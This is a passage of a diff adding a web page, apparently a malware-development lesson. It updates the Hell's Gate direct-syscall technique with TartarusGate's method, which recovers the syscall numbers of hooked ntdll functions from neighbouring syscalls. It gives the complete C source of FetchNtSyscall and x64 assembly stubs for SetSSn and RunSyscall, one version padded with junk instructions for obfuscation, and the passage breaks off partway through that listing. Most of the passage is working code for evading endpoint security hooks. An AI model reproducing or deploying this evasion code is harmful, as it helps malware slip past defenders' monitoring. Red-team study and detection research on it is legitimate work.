+                    pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low;
+                    break; // break while-loop
+                }
+
+                cw++;
+            }
+
+            break; // break for-loop
+        }
+    }
+
+    // checking if all NT_SYSCALL&#x27;s (pNtSys) element are initialized
+    if (pNtSys-&gt;dwSSn != NULL &amp;&amp; pNtSys-&gt;pSyscallAddress != NULL &amp;&amp; pNtSys-&gt;dwSyscallHash != NULL)
+        return TRUE;
+    else
+        return FALSE;
+}</code></pre>
+        </div><h3 id="enhancing-ssn-retrieval-logic" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Enhancing SSN Retrieval Logic</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Recall when Hell&#x27;s Gate searches for an SSN, it limits the search boundary by checking for the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">syscall</code> or <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ret</code> instructions. If one of these instructions is found and the SSN has not yet been obtained, the search fails, preventing the retrieval of a wrong SSN value of another syscall function.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-118970171-6a388cdf-2e50-4441-8013-d4fb0afcd03a.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="tartarusgate" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>TartarusGate</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">There is an alternative way of searching for the SSN that was introduced in <a href="https://github.com/trickster0/TartarusGate" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">TartarusGate</a>, which is illustrated in the image below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-218996854-1d20335d-ebc6-4c6c-b2a2-e8f584ac85b3.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Assume syscall B is being called using the Hell&#x27;s Gate implementation, it will search for the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">0x4c, 0x8b, 0xd1, 0xb8</code> opcodes which represent the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">mov r10, rcx</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">mov rcx, ssn</code> instructions. But as shown in the image above, there are no such opcodes, meaning Hell&#x27;s Gate&#x27;s implementation would fail in obtaining the SSN of syscall B.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">TartarusGate uses neighboring syscalls to calculate the SSN of the specified syscall. If TartarusGate searches upwards then the SSN of syscall B is the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SSN of syscall A - 1</code>. On the other hand, if TartarusGate searches downwards then the SSN of syscall B is the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SSN of syscall C + 1</code>.</p><h3 id="tartarusgate-example" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>TartarusGate Example</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">When <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtProtectVirtualMemory</code> is unhooked, its SSN is <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">0x50</code>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-318996340-a18adfb0-0cbe-4ac2-a5cd-b504f8f60525.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The image below uses <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ZwIsProcessInJob</code> as syscall A, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtProtectVirtualMemory</code> as syscall B, and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtQuerySection</code> as syscall C. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtProtectVirtualMemory</code> is hooked, but its SSN can still be calculated using the adjacent syscalls (A &amp; C).</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-418994573-eaf74f3a-647c-44a2-9ce2-ac97916a9b12.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">sing the previously explained logic where upward search uses <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SSN of syscall A - 1</code> and downward search uses <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SSN of syscall C + 1</code>, they both successfully result in <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtProtectVirtualMemory</code>&#x27;s correct SSN, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">0x50</code>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-518995420-b4dc7adb-c5f2-4a38-99a1-cfb1e845f300.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Note that the search path can extend beyond the direct neighboring syscalls. For example, if one is calling syscall C, which is hooked, then syscall C&#x27;s SSN is equal to the following:</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Syscall A&#x27;s SSN plus two</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Syscall B&#x27;s SSN plus one</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Syscall D&#x27;s SSN minus one</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Syscall E&#x27;s SSN minus two</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Syscall F&#x27;s SSN minus three</span></div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The image below illustrates this more clearly, where <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">idx</code> is the number to add or subtract.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-619273167-9a251b35-1cb2-477a-80ba-b5ac9c0093a5.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="updating-fetchntsyscall" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Updating FetchNtSyscall</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">After understanding how TartarusGate works, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">FetchNtSyscall</code> function is updated to use that search logic. Some aspects of the updated <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">FetchNtSyscall</code> function:</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RANGE</code> is 255, representing the maximum number of syscalls to go up or down in the memory.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">UP</code> is equal to 32, which is the size of a syscall. This is used when searching upwards.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">DOWN</code> is equal to -32, which is the negative size of a syscall. This is used when searching downward.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>When the search path is upwards, the specified syscall&#x27;s SSN is <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">(high &lt;&lt; 8) | low + idx</code>, where <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">idx</code> is the number of syscalls above the current syscall (<code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pFuncAddress</code>&#x27;s address).</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>When the search path is downward, the specified syscall&#x27;s SSN is <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">(high &lt;&lt; 8) | low - idx</code>, where <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">idx</code> is the number of syscalls below the current syscall (<code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pFuncAddress</code> address).</span></div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">ASM / x64</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-nasm">BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {
+
+    // initialize ntdll config if not found
+    if (!g_NtdllConf.uModule) {
+        if (!InitNtdllConfigStructure())
+            return FALSE;
+    }
+
+    if (dwSysHash != NULL)
+        pNtSys-&gt;dwSyscallHash = dwSysHash;
+    else
+        return FALSE;
+
+    for (size_t i = 0; i &lt; g_NtdllConf.dwNumberOfNames; i++){
+
+        PCHAR pcFuncName    = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
+        PVOID pFuncAddress  = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);
+
+        pNtSys-&gt;pSyscallAddress = pFuncAddress;
+
+        // if syscall found
+        if (HASH(pcFuncName) == dwSysHash) {
+
+            if (*((PBYTE)pFuncAddress) == 0x4C
+                &amp;&amp; *((PBYTE)pFuncAddress + 1) == 0x8B
+                &amp;&amp; *((PBYTE)pFuncAddress + 2) == 0xD1
+                &amp;&amp; *((PBYTE)pFuncAddress + 3) == 0xB8
+                &amp;&amp; *((PBYTE)pFuncAddress + 6) == 0x00
+                &amp;&amp; *((PBYTE)pFuncAddress + 7) == 0x00) {
+
+                BYTE high = *((PBYTE)pFuncAddress + 5);
+                BYTE low  = *((PBYTE)pFuncAddress + 4);
+                pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low;
+                break; // break for-loop [i]
+            }
+
+            // if hooked - scenario 1
+            if (*((PBYTE)pFuncAddress) == 0xE9) {
+
+                for (WORD idx = 1; idx &lt;= RANGE; idx++) {
+                    // check neighboring syscall down
+                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
+                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
+                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
+                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
+                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
+                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {
+
+                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
+                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
+                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
+                        break; // break for-loop [idx]
+                    }
+                    // check neighboring syscall up
+                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
+                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
+                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
+                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
+                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
+                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {
+
+                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
+                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * UP);
+                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
+                        break; // break for-loop [idx]
+                    }
+                }
+            }
+
+            // if hooked - scenario 2
+            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {
+
+                for (WORD idx = 1; idx &lt;= RANGE; idx++) {
+                    // check neighboring syscall down
+                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
+                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
+                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
+                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
+                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
+                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {
+
+                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
+                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
+                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
+                        break; // break for-loop [idx]
+                    }
+                    // check neighboring syscall up
+                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
+                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
+                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
+                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
+                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
+                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {
+
+                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
+                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
+                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
+                        break; // break for-loop [idx]
+                    }
+                }
+            }
+
+            break; // break for-loop [i]
+
+        }
+
+    }
+
+
+    if (pNtSys-&gt;dwSSn != NULL &amp;&amp; pNtSys-&gt;pSyscallAddress != NULL &amp;&amp; pNtSys-&gt;dwSyscallHash != NULL)
+        return TRUE;
+    else
+        return FALSE;
+}</code></pre>
+        </div><h3 id="updating-assembly-functions" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Updating Assembly Functions</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The functions <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">HellsGate</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">HellDescent</code>, found in <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/hellsgate.asm" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">hellsgate.asm</a> will be replaced with <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SetSSn</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RunSyscall</code> respectively. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SetSSn</code> requires the SSN of the syscall to be called and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RunSyscall</code> will execute it.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">There aren&#x27;t any major updates to these two functions, however, additional assembly instructions were added which do not affect the program&#x27;s execution but will add obfuscation.</p><h3 id="unobfuscated-assembly-functions" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Unobfuscated Assembly Functions</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SetSSN</code> &amp; <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RunSyscall</code> without unnecessary assembly instructions.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">ASM / x64</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-nasm">.data
+	wSystemCall DWORD 0000h
+
+.code
+
+	SetSSn PROC
+		mov wSystemCall, 000h
+		mov wSystemCall, ecx
+		ret
+	SetSSn ENDP
+
+	RunSyscall PROC
+		mov r10, rcx
+		mov eax, wSystemCall
+		syscall
+		ret
+	RunSyscall ENDP
+
+end</code></pre>
+        </div><h3 id="obfuscated-assembly-functions" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Obfuscated Assembly Functions</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SetSSN</code> &amp; <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RunSyscall</code> with added assembly instructions.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">ASM / x64</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-nasm">.data
+	wSystemCall DWORD 0000h
+
+.code
+
+	SetSSn PROC
+			xor eax, eax			; eax = 0
+			mov wSystemCall, eax		; wSystemCall = 0
